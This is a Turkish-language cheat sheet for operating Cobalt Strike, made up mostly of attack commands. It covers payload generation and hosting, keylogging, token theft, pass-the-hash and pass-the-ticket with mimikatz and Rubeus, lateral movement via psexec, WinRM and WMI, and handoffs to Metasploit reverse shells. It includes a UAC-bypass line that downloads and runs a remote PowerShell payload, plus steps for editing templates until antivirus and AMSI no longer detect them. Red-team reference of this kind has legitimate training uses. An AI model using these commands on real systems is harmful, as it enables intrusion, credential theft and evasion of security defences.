# Cobalt Strike

### Dinleyiciler

### C2 Dinleyicileri

`Cobalt Strike -> Dinleyiciler -> Ekle/Düzenle` ardından dinlemek istediğiniz yeri seçebilir, hangi tür beacon'ı kullanacağınızı (http, dns, smb...) ve daha fazlasını belirleyebilirsiniz.

### Peer2Peer Dinleyicileri

Bu dinleyicilerin beacon'ları doğrudan C2 ile iletişim kurmak zorunda değildir, başka beacon'lar aracılığıyla iletişim kurabilirler.

`Cobalt Strike -> Dinleyiciler -> Ekle/Düzenle` ardından TCP veya SMB beacon'larını seçmeniz gerekmektedir.

* **TCP beacon, seçilen portta bir dinleyici ayarlar**. Başka bir beacon'dan bir TCP beacon'a bağlanmak için `connect <ip> <port>` komutunu kullanın.
* **SMB beacon, seçilen isimle bir pipename'de dinler**. Bir SMB beacon'a bağlanmak için `link [hedef] [pipe]` komutunu kullanmanız gerekmektedir.

### Payload'lar Oluşturma ve Barındırma

#### Dosyalarda Payload'lar Oluşturma

`Saldırılar -> Paketler ->`&#x20;

* **`HTMLApplication`** HTA dosyaları için
* **`MS Office Macro`** makro içeren bir ofis belgesi için
* **`Windows Executable`** .exe, .dll veya servis .exe için
* **`Windows Executable (S)`** **stageless** .exe, .dll veya servis .exe için (staged'den daha az IoC'ye sahip)

#### Payload'ları Oluşturma ve Barındırma

`Saldırılar -> Web Drive-by -> Scripted Web Delivery (S)` Bu, cobalt strike'dan beacon'ı indirmek için bitsadmin, exe, powershell ve python gibi formatlarda bir script/executable oluşturur.

#### Payload'ları Barındırma

Eğer barındırmak istediğiniz dosyaya zaten sahipseniz, sadece `Saldırılar -> Web Drive-by -> Dosya Barındır` seçeneğine gidin ve barındırmak istediğiniz dosyayı ve web sunucusu yapılandırmasını seçin.

### Beacon Seçenekleri

<pre class="language-bash"><code class="lang-bash"># Yerel .NET binary'si çalıştırma
execute-assembly &#x3C;/path/to/executable.exe>

# Ekran görüntüleri
printscreen    # PrintScr yöntemiyle tek bir ekran görüntüsü al
screenshot     # Tek bir ekran görüntüsü al
screenwatch    # Masaüstünün periyodik ekran görüntülerini al
## Görüntüleri görmek için Görünüm -> Ekran Görüntüleri'ne gidin

# keylogger
keylogger [pid] [x86|x64]
## Basılan tuşları görmek için Görünüm -> Tuş Vuruşları'na gidin

# portscan
portscan [pid] [arch] [hedefler] [portlar] [arp|icmp|none] [maksimum bağlantı] # Başka bir işlem içine portscan eylemini enjekte et
portscan [hedefler] [portlar] [arp|icmp|none] [maksimum bağlantı]

# Powershell
# Powershell modülü içe aktarma
powershell-import C:\path\to\PowerView.ps1
powershell &#x3C;powershell komutunu buraya yazın>

# Kullanıcı taklit etme
## Kimlik bilgileriyle token oluşturma
make_token [DOMAIN\kullanıcı] [şifre] # Ağdaki bir kullanıcıyı taklit etmek için token oluşturur
ls \\bilgisayar_adı\c$ # Oluşturulan token'ı kullanarak bir bilgisayara C$'a erişmeyi deneyin
rev2self # make_token ile oluşturulan token'ı kullanmayı bırakın
## make_token kullanımı, 4624 numaralı olayı oluşturur: Bir hesap başarıyla oturum açıldı. Bu olay, Windows etki alanında çok yaygındır, ancak Logon Türü üzerinde filtreleme yaparak daraltılabilir. Yukarıda belirtildiği gibi, LOGON32_LOGON_NEW_CREDENTIALS kullanır.

# UAC Bypass
elevate svc-exe &#x3C;dinleyici>
elevate uac-token-duplication &#x3C;dinleyici>
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"

## pid'den token çalma
## make_token gibi, ancak token'ı bir işlemden çalar
steal_token [pid] # Ayrıca, bu yerel olmayan eylemler için kullanışlıdır
## API belgelerinden biliyoruz ki bu oturum açma türü "çağrıcının mevcut token'ını klonlamasına izin verir". Bu nedenle Beacon çıktısı Impersonated &#x3C;current_username> diyor - kendi klonlanmış token'ımızı taklit ediyor.
ls \\bilgisayar_adı\c$ # Oluşturulan token'ı kullanarak bir bilgisayara C$'a erişmeyi deneyin
rev2self # steal_token ile çalınan token'ı kullanmayı bırakın

## Yeni kimlik bilgileriyle işlem başlatma
spawnas [domain\kullanıcıadı] [şifre] [dinleyici] # Okuma erişimine sahip bir dizinde yapın, örneğin: cd C:\
## make_token gibi, bu da Windows etkinliği 4624: Bir hesap başarıyla oturum açıldı, ancak 2 (LOGON32_LOGON_INTERACTIVE) bir oturum açma türüyle oluşturur. Arayan kullanıcıyı (TargetUserName) ve taklit edilen kullanıcıyı (TargetOutboundUserName) ayrıntılı olarak belirtir.

## İşleme enjekte etme
inject [pid] [x64|x86] [dinleyici]
## OpSec açısından: Gerçekten yapmanız gerekmese de (örneğin x86 -> x64 veya x64 -> x86), platformlar arası enjeksiyon yapmayın.

## Hash'i geçir
## Bu değiştirme işlemi, yüksek riskli bir eylem olan LSASS belleğinin yamasını gerektirir, yerel yönetici ayrıcalıklarını gerektirir ve Korunan Süreç Işığı (PPL) etkinse pek mümkün değildir.
pth [pid] [arch] [DOMAIN\kullanıcı] [NTLM hash]
pth [DOMAIN\kullanıcı] [NTLM hash]

## Mimikatz aracılığıyla hash geçirme
mimikatz sekurlsa::pth /user:&#x3C;kullanıcıadı> /domain:&#x3C;ETKİ ALANI> /ntlm:&#x3C;NTLM HASH> /run:"powershell -w hidden"
## /run olmadan, mimikatz bir cmd.exe başlatır, masaüstüne sahip bir kullanıcı olarak çalışıyorsanız kabuğu görecektir (SYSTEM olarak çalışıyorsanız sorun yoktur)
steal_token &#x3C;pid> # mimikatz tarafından oluşturulan işlemden token çal

## Bilet geçirme
## Bir bilet iste
execute-assembly C:\path\Rubeus.exe asktgt /user:&#x3C;kullanıcıadı> /domain:&#x3C;etki alanı> /aes256:&#x3C;aes_keys> /nowrap /opsec
## Yeni bilet için kullanılacak yeni bir oturum açma oluştur (kompromize edileni üzerine yazmamak için)
make_token &#x3C;etki alanı>\&#x3C;kullanıcıadı> DummyPass
## Saldırgan makinede bilet yazın ve yükleyin
[System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\jkingTGT.kirbi", [System.Convert]::FromBase64String("[...bilet...]"))
kerberos_ticket_use C:\Users\Administrator\Desktop\jkingTGT.kirbi

## SYSTEM'den bilet geçirme
## Bilet ile yeni bir işlem oluştur
execute-assembly C:\path\Rubeus.exe asktgt /user:&#x3C;KULLANICIAD> /domain:&#x3C;ETKİ ALANI> /aes256:&#x3C;AES KEY> /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe
## O işlemden token çal
steal_token &#x3C;pid>

## Bilet çıkar + Bilet geçirme
### Biletleri listele
execute-assembly C:\path\Rubeus.exe triage
### Luid'e göre ilgili biletleri dök
execute-assembly C:\path\Rubeus.exe dump /service:krbtgt /luid:&#x3C;luid> /nowrap
### Yeni oturum açma oluştur, luid ve processid'yi kaydet
execute-assembly C:\path\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
### Oluşturulan oturuma bilet ekle
execute-assembly C:\path\Rubeus.exe ptt /luid:0x92a8c /ticket:[...base64-ticket...]
### Son olarak, yeni süreçten token çal
steal_token &#x3C;pid>

# Yanal Hareket
## Eğer bir token oluşturulduysa kullanılacak
jump [method] [target] [listener]
## Yöntemler:
## psexec                    x86   Bir hizmeti kullanarak bir Hizmet EXE artefaktını çalıştırın
## psexec64                  x64   Bir hizmeti kullanarak bir Hizmet EXE artefaktını çalıştırın
## psexec_psh                x86   Bir hizmeti kullanarak bir PowerShell tek satırlık komut çalıştırın
## winrm                     x86   WinRM üzerinden bir PowerShell komut dosyası çalıştırın
## winrm64                   x64   WinRM üzerinden bir PowerShell komut dosyası çalıştırın

remote-exec [method] [target] [command]
## Yöntemler:
<strong>## psexec                          Hizmet Denetim Yöneticisi üzerinden uzaktan çalıştırma
</strong>## winrm                           WinRM üzerinden uzaktan çalıştırma (PowerShell)
## wmi                             WMI üzerinden uzaktan çalıştırma

## Wmi ile bir beacon çalıştırmak için (jump komutunda değil) sadece beacon'u yükleyin ve çalıştırın
beacon> upload C:\Payloads\beacon-smb.exe
beacon> remote-exec wmi srv-1 C:\Windows\beacon-smb.exe


# Oturumu Metasploit'e Aktarma - Dinleyici Aracılığıyla
## Metasploit ana bilgisayarında
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
msf6 exploit(multi/handler) > set LHOST eth0
msf6 exploit(multi/handler) > set LPORT 8080
msf6 exploit(multi/handler) > exploit -j

## Cobalt Strike üzerinde: Listeners > Ekle ve Payloay'ı Yabancı HTTP olarak ayarlayın. Host'u 10.10.5.120, Port'u 8080 olarak ayarlayın ve Kaydet'e tıklayın.
beacon> spawn metasploit
## Yabancı dinleyici ile sadece x86 Meterpreter oturumları başlatabilirsiniz.

# Oturumu Metasploit'e Aktarma - Shellcode Enjeksiyonu Aracılığıyla
## Metasploit ana bilgisayarında
msfvenom -p windows/x64/meterpreter_reverse_http LHOST=&#x3C;IP> LPORT=&#x3C;PORT> -f raw -o /tmp/msf.bin
## msfvenom'u çalıştırın ve multi/handler dinleyicisini hazırlayın

## Bin dosyasını cobalt strike ana bilgisayarına kopyalayın
ps
shinject &#x3C;pid> x64 C:\Payloads\msf.bin #Metasploit shellcode'unu bir x64 sürece enjekte edin

# Metasploit oturumunu cobalt strike'a aktarma
## Aşamasız Beacon shellcode'u oluşturun, Attacks > Packages > Windows Executable (S) gidin, istenen dinleyiciyi seçin, Çıktı türü olarak Raw'ı seçin ve Use x64 payload'ı seçin.
## Metasploit'te post/windows/manage/shellcode_inject kullanarak oluşturulan cobalt strike shellcode'unu enjekte edin


# Pivoting
## Takım sunucusunda bir socks proxy açın
beacon> socks 1080

# SSH bağlantısı
beacon> ssh 10.10.17.12:22 kullanıcıadı şifre</code></pre>

## AV'leri Engelleme

### Artifact Kit

Genellikle `/opt/cobaltstrike/artifact-kit` dizininde, cobalt strike'ın ikili beacon'ları oluşturmak için kullanacağı kodu ve önceden derlenmiş şablonları (`/src-common` içinde) bulabilirsiniz.

[ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) kullanarak oluşturulan arka kapıyla (veya sadece derlenmiş şablonla) defender'ın tetiklenmesine neden olan şeyi bulabilirsiniz. Genellikle bir dizedir. Bu nedenle, arka kapıyı oluşturan kodu değiştirerek o dizenin nihai ikili dosyada görünmemesini sağlayabilirsiniz.

Kodu değiştirdikten sonra aynı dizinde `./build.sh` komutunu çalıştırın ve `dist-pipe/` klasörünü Windows istemcisine `C:\Tools\cobaltstrike\ArtifactKit` dizinine kopyalayın.
```
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
```
Unutmayın, Cobalt Strike'e diskten istediğimiz kaynakları kullanması için agresif betik `dist-pipe\artifact.cna` yüklemeniz gerekmektedir.

### Kaynak Kiti

KaynakKiti klasörü, Cobalt Strike'ın betik tabanlı yüklerinin şablonlarını içerir, bunlar arasında PowerShell, VBA ve HTA bulunur.

Şablonlarla birlikte [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) kullanarak, savunma mekanizmalarının (bu durumda AMSI) neden hoşlanmadığını bulabilir ve onu değiştirebilirsiniz:
```
.\ThreatCheck.exe -e AMSI -f .\cobaltstrike\ResourceKit\template.x64.ps1
```
Tespit edilen satırları değiştirerek yakalanmayacak bir şablon oluşturabilirsiniz.

Cobalt Strike'e diskin kaynaklarını değil, istediğimiz kaynakları kullanması için agresif betik `ResourceKit\resources.cna`'yı yüklemeyi unutmayın.
```bash
cd C:\Tools\neo4j\bin
neo4j.bat console
http://localhost:7474/ --> Change password
execute-assembly C:\Tools\SharpHound3\SharpHound3\bin\Debug\SharpHound.exe -c All -d DOMAIN.LOCAL



# Change powershell
C:\Tools\cobaltstrike\ResourceKit
template.x64.ps1
# Change $var_code -> $polop
# $x --> $ar
cobalt strike --> script manager --> Load --> Cargar C:\Tools\cobaltstrike\ResourceKit\resources.cna

#artifact kit
cd  C:\Tools\cobaltstrike\ArtifactKit
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .


```

